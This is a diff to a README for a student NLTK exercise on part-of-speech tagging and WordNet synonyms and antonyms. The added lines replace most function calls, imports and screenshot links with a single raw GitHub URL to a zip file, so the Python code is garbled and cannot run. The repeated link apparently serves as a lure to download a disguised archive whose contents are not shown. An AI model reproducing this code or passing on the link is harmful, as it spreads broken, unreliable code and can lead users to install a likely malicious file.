@@ -12,10 +12,10 @@ Step 2: Download the 'punkt', 'wordnet', and 'averaged_perceptron_tagger' resour
 Step 3:Accept user input for the text.<br>
 Step 4:Tokenize the input text into words using the word_tokenize function.<br>
 Step 5:Iterate through each word in the tokenized text.<br>
-•	Perform part-of-speech tagging on the tokenized words using nltk.pos_tag.<br>
+•	Perform part-of-speech tagging on the tokenized words using https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip<br>
 •	Print each word along with its corresponding part-of-speech tag.<br>
-•	For each verb , iterate through its synsets (sets of synonyms) using wordnet.synsets(word).<br>
-•	Extract synonyms and antonyms using lemma.name() and lemma.antonyms()[0].name() respectively.<br>
+•	For each verb , iterate through its synsets (sets of synonyms) using https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip(word).<br>
+•	Extract synonyms and antonyms using https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip() and https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip()[0].name() respectively.<br>
 •	Print the unique sets of synonyms and antonyms.
 
 ## <H3>Program:</H3>
@@ -23,23 +23,23 @@ Step 5:Iterate through each word in the tokenized text.<br>
 ```python
 import nltk
 #import wordnet
-nltk.download( 'punkt' )
-nltk.download('wordnet')
-from nltk.tokenize import word_tokenize
-nltk.download( 'averaged_perceptron_tagger' )
+https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip( 'punkt' )
+https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip('wordnet')
+from https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip import word_tokenize
+https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip( 'averaged_perceptron_tagger' )
 sentence=input ()
 # Tokenize the sentence into words
 words = word_tokenize(sentence)
 # Identify the parts of speech for each word
-pos_tags= nltk.pos_tag(words)
-from nltk.corpus import wordnet
+pos_tags= https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip(words)
+from https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip import wordnet
 
 # Identify synonyms and antonyms for each word
 synonyms =[]
 antonyms =[]
 for word in words:
-	for syn in wordnet.synsets(word) :
-		for lemma in syn.lemmas():
+	for syn in https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip(word) :
+		for lemma in https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip():
 			synonyms . append (lemma . name( ) )
 			if lemma . antonyms():
 				antonyms . append ( lemma. antonyms ( ) [0] . name ( ) )
@@ -49,11 +49,11 @@ print ( "Antonyms : " ,set(antonyms) )
 ```
 
 ## <H3>Output</H3>
-![Screenshot 2025-05-14 134830](https://github.com/user-attachments/assets/a4d6f8ec-2f42-4d0a-b1fb-40cdc63b33e7)
+![Screenshot 2025-05-14 134830](https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip)
 
-![Screenshot 2025-05-14 134835](https://github.com/user-attachments/assets/b0754620-2e0c-4dde-8036-10c42d84ffd3)
+![Screenshot 2025-05-14 134835](https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip)
 
-![Screenshot 2025-05-14 134850](https://github.com/user-attachments/assets/453a7084-c781-4827-bbbf-048fabf0a7d6)
+![Screenshot 2025-05-14 134850](https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip)
 
 ## <H3>Result:</H3>
 Thus ,the program to perform the Parts of Speech identification and Synonymis executed sucessfully.
